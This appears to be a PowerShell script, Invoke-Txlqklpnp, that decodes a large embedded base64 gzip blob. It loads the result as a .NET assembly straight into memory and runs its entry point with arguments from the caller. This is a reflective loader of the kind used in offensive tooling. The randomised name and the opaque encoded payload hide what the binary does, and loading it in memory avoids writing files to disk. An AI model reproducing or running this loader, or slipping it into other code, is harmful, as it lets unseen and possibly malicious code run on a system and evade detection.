function Invoke-Txlqklpnp ($Params){
    if (!$Txlqklpnp_assembly){
        $compressed = "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"
        $bytes = [System.Convert]::FromBase64String($compressed)
        $input = New-Object System.IO.MemoryStream( , $bytes)
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo($output)
        $gzipStream.Close()
	    $input.Close()
	    [byte[]] $decompressed_bytes = $output.ToArray()
        $Script:Txlqklpnp_assembly = [System.Reflection.Assembly]::Load($decompressed_bytes)
        "Loaded!"
    }
    $Txlqklpnp_assembly.EntryPoint.Invoke($null, (, $Params.split()))
}